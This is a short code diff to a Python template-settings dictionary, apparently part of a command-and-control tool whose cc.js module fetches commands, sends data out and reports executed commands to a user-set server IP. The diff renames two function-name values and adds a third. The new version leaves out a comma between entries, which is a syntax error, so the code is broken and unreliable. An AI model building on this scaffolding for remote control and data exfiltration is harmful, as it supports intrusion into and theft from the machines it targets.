@@ -18,8 +18,9 @@ modules_args = {
 	b'{{CC_SERVER_IP_ADDR}}': b'', # Defined by user.
 	# This is here to make the following lines work:
 	# let getCmds = {{CC_GET_CMDS_FN}}; let sendData = {{CC_SEND_DATA_FN}};
-	b'{{CC_GET_CMDS_FN}}': b'get_cmds_fn', # function name is constant, defined in cc.js
-	b'{{CC_SEND_DATA_FN}}': b'send_data_fn' # function name is constant, defined in cc.js
+	b'{{CC_GET_CMDS_FN}}': b'getCmds', # function name is constant, defined in cc.js
+	b'{{CC_SEND_DATA_FN}}': b'sendData' # function name is constant, defined in cc.js
+	b'{{CC_EXECUTED_CMD_FN}}': b'executedCmd' # function name is constant, defined in cc.js
 }
 
 def main():
